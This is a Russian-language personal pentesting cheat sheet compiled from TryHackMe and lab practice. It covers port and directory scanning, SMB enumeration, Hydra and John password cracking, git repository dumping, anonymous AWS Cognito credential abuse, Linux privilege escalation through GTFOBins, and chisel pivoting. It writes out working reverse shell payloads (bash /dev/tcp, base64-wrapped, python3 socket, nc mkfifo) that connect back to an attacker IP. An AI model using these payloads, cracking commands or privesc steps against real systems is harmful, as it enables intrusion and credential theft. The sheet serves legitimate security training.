# Инструменты — рабочий справочник

Шпаргалка по инструментам, освоенным на практике (THM/лабы).
Формат: что делает → команда-пример → заметки.
Открыл на новой цели → скопировал команду.

---
## Recon / сканирование

### nmap — сканирование портов и сервисов
Первый шаг на любой цели: что открыто, какие версии (→ CVE по версиям).

nmap -sV -sC -p- <IP>

- `-sV` — версии сервисов (Apache 2.4.41, OpenSSH 8.2...) → гуглить CVE по версии
- `-sC` — дефолтные NSE-скрипты (авторазведка)
- `-p-` — все 65535 портов (`-p 80,443` конкретные, `-p 1-1000` диапазон)
- `-A` — агрессивно (версии+скрипты+ОС), `-sS` SYN-скан скрытный, `-sU` UDP

### gobuster / ffuf — перебор скрытого
Директории, файлы, поддомены (vhost).

# директории + файлы (ОБЯЗАТЕЛЬНО -x расширения, иначе пропустишь .php)
gobuster dir -u https://<цель>/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -k

# vhost (поддомены через заголовок Host — для .thm и локальных)
gobuster vhost -u https://<цель> --domain <домен> -w <wordlist> -k --append-domain

# ffuf аналог vhost
ffuf -w <wordlist> -u https://<цель>/ -H "Host: FUZZ.<домен>" -k -fs <размер_дефолта>

- `-k` — игнорировать SSL-серт (самоподписанные на CTF)
- `-x` — расширения файлов (критично! без них только директории)
- `-fs` — фильтр по размеру ответа (отсечь одинаковые «не найдено»)
- vhost, НЕ dns, для .thm (публичный DNS про .thm не знает)

---
## Перечисление сервисов

### enum4linux / smbclient — SMB (порты 139/445)
Разведка сетевых папок (шар), пользователей.

enum4linux -a <IP>                        # полная разведка SMB (шары, юзеры)
smbclient -L //<IP> -N                    # список шар анонимно
smbclient //<IP>/<Share> -N               # подключиться к шаре (-N без пароля)
  # внутри: ls, get <файл>, exit (это НЕ shell, свои команды)

Частая утечка: анонимная шара (Anonymous) с файлами (имена юзеров, пароли).

---
## Взлом паролей / хешей

### Hydra — брутфорс СЕТЕВЫХ сервисов
SSH, FTP, HTTP-формы. Для первого входа снаружи.

hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>

- `-l` один логин / `-L` список логинов, `-P` словарь паролей
- медленный по SSH (сервер тормозит), `-t 4` ограничить потоки
- НЕ для порядок-зависимых атак / когда уже внутри (там recon ИЗНУТРИ)

### John the Ripper — взлом ХЕШЕЙ (локально, быстро)
Подбор паролей/passphrase по хешу. Быстрее сетевого брутфорса.

john --format=<тип> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=<тип> hash.txt        # показать взломанное

- `--format=Raw-MD5` / `raw-sha1` / `bcrypt` и т.д.
- полный путь к rockyou обязателен (не просто rockyou.txt)

### ssh2john — passphrase зашифрованного SSH-ключа
Ключ id_rsa защищён passphrase → превратить в хеш → john.

ssh2john id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash

Локальный перебор (быстро), в отличие от SSH-брутфорса.

### hashid — определение типа хеша
Перед взломом узнать, что за хеш.

hashid <хеш>

- MD5 = 32 hex, SHA-1 = 40 hex, SHA-256 = 64 hex, bcrypt = $2a$/$2b$
- ВАЖНО: 40-hex в контексте .git = SHA-1 git-объекты (git show), НЕ брутфорс

### генерация MD5 (для IDOR через хешированные id)

echo -n "5" | md5sum        # -n обязателен (без перевода строки!)

---
## Утечки и код

### git-dumper — выкачать .git с сервера
.git на сервере = вся история кода (утечка). Реконструирует репозиторий.

pipx install git-dumper        # (не pip напрямую — externally-managed)
git-dumper http://<IP>/.git/ loot
cd loot
git log --all                  # все коммиты (вкл. "удалённые")
git show <commit>              # содержимое коммита (секреты в старых!)
git cat-file -p <хеш>          # содержимое git-объекта

Секреты часто в старых/удалённых коммитах.

---
## Cloud (AWS)

### AWS CLI — Cognito + DynamoDB
Эксплуатация открытого Cognito Identity Pool (анонимные креды без auth).

sudo apt install awscli

# 1. получить Identity ID из открытого Pool (без логина!)
aws cognito-identity get-id --identity-pool-id <POOL_ID> --region <region>

# 2. временные guest-креды для этого identity
aws cognito-identity get-credentials-for-identity --identity-id <ID> --region <region>

# 3. настроить креды переменными окружения
export AWS_ACCESS_KEY_ID=<...>
export AWS_SECRET_ACCESS_KEY=<...>
export AWS_SESSION_TOKEN=<...>

# 4. дампнуть DynamoDB (если guest-роль слишком щедрая)
aws dynamodb scan --table-name <TABLE> --region <region>

НЕ через браузер/login — эксплуатация раздачи анонимных кредов.

---
## Сертификаты / DNS

### openssl — читать сертификат (скрытые поддомены)
Серт раскрывает поддомены в SAN, которых нет в словарях.

echo | openssl s_client -connect <host>:443 2>/dev/null | openssl x509 -noout -text
  - смотри: Subject, Subject Alternative Name (SAN) — там поддомены
echo | openssl s_client -connect <host>:443 -servername <vhost> 2>/dev/null | openssl x509 -noout -text
  - -servername = серт конкретного vhost (не главного домена)

### dig / host — DNS-записи

dig @<IP_машины> <домен> ANY        # спрашивать DNS МАШИНЫ, не публичный
dig <домен> CNAME / TXT / A
host <домен>

- для .thm: публичный DNS (@1.1.1.1) не знает → NXDOMAIN; спрашивать @IP машины
- takeover: CNAME на заброшенный сервис = захватываемый

---
## Прокси / перехват

### Burp Suite
Перехват/модификация HTTP(S), Repeater, Intruder.
- заходить на цель по IP, HTTP-прокси (не SOCKS)
- для HTTPS без предупреждений: установить Burp CA в браузер (http://burp → CA cert)
- Intruder: Sniper (1 позиция), Cluster bomb (все комбинации), Pitchfork (параллельно)
- порядок-зависимые атаки: Resource pool = 1 concurrent request

### curl — быстрый запрос без браузера

curl -k https://<host>/            # -k игнорировать серт
curl -k https://<host>/ -H "Host: <vhost>"   # конкретный vhost
curl -I https://<host>/            # только заголовки (fingerprint)

---
## Настройка окружения (грабли)

- `/etc/hosts` — для .thm доменов: `echo "<IP> <домен>" | sudo tee -a /etc/hosts`
- rockyou: `/usr/share/wordlists/rockyou.txt` (если .gz → `gunzip`)
- НЕ создавать рабочие файлы через sudo (владелец root, сам не прочитаешь)
- работать в ~ (домашней папке), не в / (нет прав)
- chmod 600 для id_rsa (SSH требует, иначе "permissions too open")
- pip блокируется (externally-managed) → pipx install ИЛИ --break-system-packages

## Privilege Escalation (Linux)

### Автоматический enumeration — скрипты
Собирают все векторы privesc разом (sudo, SUID, cron, слабые права, ядро).

**LinEnum** (github.com/rebootuser/LinEnum):
```bash
# на СВОЕЙ машине: поднять http-сервер в папке со скриптом
python3 -m http.server 8000

# на ЦЕЛИ: скачать и запустить
wget http://<твой_IP>:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
./LinEnum.sh -t          # -t = thorough (углублённая проверка)
```

**LinPEAS** (аналог, мощнее, с подсветкой находок):
```bash
wget http://<твой_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Оба выдают отчёт: sudo-права, SUID, cron, читаемые файлы, версия ядра, capabilities.
LinPEAS подсвечивает "интересное" цветом; LinEnum проще/чище. Держать оба.

### Ручной privesc-recon (базовые команды)
```bash
whoami; id                              # кто я, в каких группах
sudo -l                                 # что могу от root (→ GTFOBins)
find / -perm -4000 -type f 2>/dev/null  # SUID-бинарники (права владельца)
find / -perm -2000 -type f 2>/dev/null  # SGID
getcap -r / 2>/dev/null                 # capabilities
cat /etc/crontab; ls -la /etc/cron.*    # cron-задачи (изменяемый root-скрипт?)
uname -a                                # версия ядра (→ kernel exploit)
cat /etc/passwd                         # пользователи (+ writable?)
ls -la /home/*                          # чужие домашние папки, ключи
history; cat ~/.bash_history            # история команд (пароли?)
```

### GTFOBins — ключевой ресурс
`gtfobins.github.io` — база «как из разрешённой sudo-команды / SUID-бинарника
получить shell». Нашёл в `sudo -l` или SUID необычную команду → ищешь её на GTFOBins.

```bash
# пример: sudo -l показал (root) NOPASSWD: /usr/bin/find
# на GTFOBins для find:
sudo find . -exec /bin/sh \; -quit    # → root shell
```

## Reverse Shell

### revshells.com — генератор reverse shell (закладка!)
https://www.revshells.com/
Выбираешь тип shell (bash/python/nc/php/perl...) + вводишь свой IP:порт → готовая
команда для вставки. Не надо составлять вручную. Есть listener-команды тоже.
Механика: ЖЕРТВА подключается к АТАКУЮЩЕМУ (обходит firewall — исходящие разрешены).

### Listener (на своей Kali — принять shell)
nc -lvnp 4444        # -l слушать, -v verbose, -n no-DNS, -p порт

### Частые reverse shell payloads (подставить свой IP:порт)
# bash
bash -i >& /dev/tcp/IP/4444 0>&1

# bash через base64 (обход проблем с кавычками в инъекциях — SSTI/YAML/cmd injection)
echo -n 'bash -i >& /dev/tcp/IP/4444 0>&1' | base64      # закодировать на Kali
# в payload: echo <base64> | base64 -d | bash

# python3
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'

# nc без -e (mkfifo) — если нет nc -e
mkfifo /tmp/f; nc IP 4444 0</tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

### Апгрейд «немого» shell до интерактивного
python3 -c 'import pty; pty.spawn("/bin/bash")'
# затем Ctrl+Z → stty raw -echo; fg → Enter (полный TTY: стрелки, автодополнение)

### Грабли reverse shell
- IP = ТВОЙ (tun0 в THM: ip a | grep tun0), НЕ жертвы
- порт listener = порт в payload (совпадают)
- в инъекциях (SSTI/YAML/cmd) кавычки ломаются → base64-обёртка спасает
- "connect from [IP]" в listener = shell прилетел (печатай вслепую whoami/id)

---
## Pivoting / туннелирование

### chisel — проброс внутренних портов цели на свою Kali
Проблема: сервисы цели на 127.0.0.1 (localhost) снаружи недоступны — только curl изнутри shell.
chisel пробрасывает их на Kali, чтобы открыть в браузере.

# 1. на СВОЕЙ Kali — сервер (слушает)
chisel server -p 9999 --reverse

# 2. доставить chisel на цель (python3 -m http.server на Kali → wget на цели)

# 3. на ЦЕЛИ — клиент (пробрасывает порты цели к тебе)
./chisel client <KALI_IP>:9999 R:3000:127.0.0.1:3000 R:8080:127.0.0.1:8080 R:9000:127.0.0.1:9000
# R:локальный_порт:цель_хост:цель_порт — теперь на Kali 127.0.0.1:3000 = сервис цели

### Грабли chisel
- ПОРЯДОК: сначала сервер на Kali, потом клиент на цели
- "connection refused" у клиента = сервер не запущен / не тот IP:порт
- KALI_IP = tun0 (проверь ip a | grep tun0)